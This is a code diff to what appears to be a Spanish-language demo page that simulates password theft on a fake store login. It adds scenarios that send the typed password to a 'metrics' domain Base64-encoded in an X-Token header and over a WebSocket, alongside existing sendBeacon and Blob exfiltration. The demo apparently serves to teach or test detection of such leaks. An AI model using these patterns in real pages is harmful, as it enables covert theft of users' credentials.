@@ -10,6 +10,9 @@
       "Como Facebook: la página cifra la contraseña (RSA con Web Crypto) y envía solo el valor cifrado a la tienda.",
     "cifrado-robo":
       "La página cifra la contraseña, pero un script envía ese valor cifrado al dominio de métricas.",
+    "robo-encabezado":
+      "El script envía la contraseña en Base64 dentro de un encabezado HTTP (X-Token), que la red no deja ver.",
+    "robo-websocket": "El script envía la contraseña por un WebSocket al dominio de métricas.",
     "robo-navega":
       "Como un sitio real: el script roba la contraseña y la tienda redirige a otra página tras iniciar sesión.",
   };
@@ -68,6 +71,14 @@
       navigator.sendBeacon(`${METRICAS}/recibir/beacon`, "c=" + btoa(clave));
     } else if (escenario === "robo-blob") {
       fetch(`${METRICAS}/recibir/blob`, { method: "POST", body: new Blob([clave]) });
+    } else if (escenario === "robo-encabezado") {
+      fetch(`${METRICAS}/recibir/encabezado`, { method: "POST", headers: { "X-Token": btoa(clave) } });
+    } else if (escenario === "robo-websocket") {
+      const socket = new WebSocket(`ws://127.0.0.1:${location.port}/ws`);
+      socket.addEventListener("open", () => {
+        socket.send(JSON.stringify({ evento: "login", c: clave }));
+        socket.close();
+      });
     } else if (escenario === "url") {
       fetch("/recibir/consulta?clave=" + encodeURIComponent(clave), { method: "POST" });
     }
